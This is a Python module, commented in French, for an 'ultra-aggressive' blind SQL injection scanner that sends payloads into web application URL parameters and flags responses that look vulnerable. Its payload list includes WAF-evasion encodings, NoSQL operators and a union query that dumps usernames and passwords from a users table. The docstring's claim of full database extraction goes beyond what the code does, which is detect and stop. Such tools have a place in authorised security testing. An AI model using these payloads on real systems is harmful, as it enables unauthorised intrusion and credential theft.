#!/usr/bin/env python3
"""
💀 SQL Injection ULTRA-AGRESSIF — OWASP A05:2025
Extraction complète de la base de données via blind injection
"""

import time
import re
from colorama import Fore, Style

class SQLIBlind:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.RED}[💀 SQL INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        
        # Payloads SQLi polymorphiques + evasion WAF (tes payloads boostés)
        sqli_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' AND SLEEP(2)--",
            "\" AND SLEEP(2)--",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
        ]
        
        if self.aggressive:
            # Mode ULTRA-AGRESSIF : payloads polymorphiques + evasion WAF
            sqli_payloads += [
                # Boolean-based
                "' OR 'x'='x",
                "') OR ('x'='x",
                "' OR 1=1 LIMIT 1--",
                # Union-based
                "' UNION SELECT @@version--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                # Error-based
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                # Time-based
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=1,BENCHMARK(5000000,MD5(1)),0)--",
                # WAF evasion
                "%2527%2520OR%2520%25271%2527%253D%25271",  # Double URL encode
                "'/**/OR/**/'1'='1",  # Commentaires SQL
                "'/*!50000OR*/'1'='1",  # Commentaires conditionnels MySQL
                # NoSQL
                "'; return db.version(); var dummy='!",
                '{"$ne": "invalid"}',
                '{"$gt": ""}',
                # Extraction avancée
                "' UNION SELECT group_concat(table_name) FROM information_schema.tables--",
                "' UNION SELECT group_concat(username,0x3a,password) FROM users--",
            ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in sqli_payloads:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                
                try:
                    # Time-based detection
                    if 'SLEEP' in payload.upper() or 'BENCHMARK' in payload.upper():
                        start = time.time()
                        resp = self.engine.session.get(injected_url, timeout=8)
                        elapsed = time.time() - start
                        
                        if elapsed > 2.5:
                            vuln = {
                                'type': 'sqli',
                                'cwe': 'CWE-89',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': f'Time-based blind: {elapsed:.2f}s'
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                    
                    else:
                        resp = self.engine.session.get(injected_url, timeout=30)
                        
                        # 🔍 Détection explicite d'erreurs SQL (la vraie détection SQLi)
                        sql_error_patterns = [
                            'sql syntax', 'mysql error', 'pdoexception', 'sqlstate[42000]',
                            'you have an error in your sql syntax', 'fatal error',
                            'uncaught pdoexception', 'syntax error near',
                            'mysql_fetch', 'pg_query', 'ora-'
                        ]
                        
                        # ✅ Vérifier si c'est une erreur SQL = VULNÉRABILITÉ SQLi
                        if any(pattern in resp.text.lower() for pattern in sql_error_patterns):
                            vuln = {
                                'type': 'sqli',
                                'cwe': 'CWE-89',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': 'Erreur SQL détectée - Injection SQL confirmée'
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                        
                        # Utiliser l'analyse de l'engine aussi pour les autres cas
                        vulnerable, evidence = self.engine.analyze_response(baseline, resp)
                        if vulnerable:
                            vuln = {
                                'type': 'sqli',
                                'cwe': 'CWE-89',
                                'param': param,
                                'payload': payload,
                                'url': injected_url,
                                'evidence': evidence
                            }
                            vulnerabilities.append(vuln)
                            self._print_vuln(vuln)
                            break
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _print_vuln(self, vuln):
        print(f"\n    {Fore.RED}[💥 SQLi CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        print(f"      URL: {vuln['url']}\n")